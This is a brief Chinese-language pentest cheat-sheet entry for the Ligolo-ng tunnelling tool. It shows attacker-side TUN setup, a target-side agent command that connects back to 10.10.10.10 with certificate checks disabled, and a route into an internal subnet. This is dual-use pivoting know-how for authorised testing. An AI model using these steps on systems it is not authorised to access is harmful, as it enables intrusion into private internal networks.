### Ligolo-ng

| 属性 | 值 |
|------|-----|
| 版本 | 0.5.1 |
| 平台 | 跨平台 |
| 风险 | 🟠 中 |
| 标签 | `内网穿透` `TUN` `代理` |

## Ligolo-ng 代理端启动

### 攻击机配置 TUN 接口并启动服务端
```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy
```

### 目标机启动客户端连接
```bash
bash ligolo_agent_start.sh -connect 10.10.10.10:11601 -ignore-cert
```

### 攻击机服务端添加路由
```bash
ligolo-proxy> session
ligolo-proxy> start
sudo ip route add 192.168.1.0/24 dev ligolo
```

- ✓ 基于 TUN 接口，支持全协议转发
- ✓ 性能优异，无需配置 ProxyChains
- 支持多级级联代理
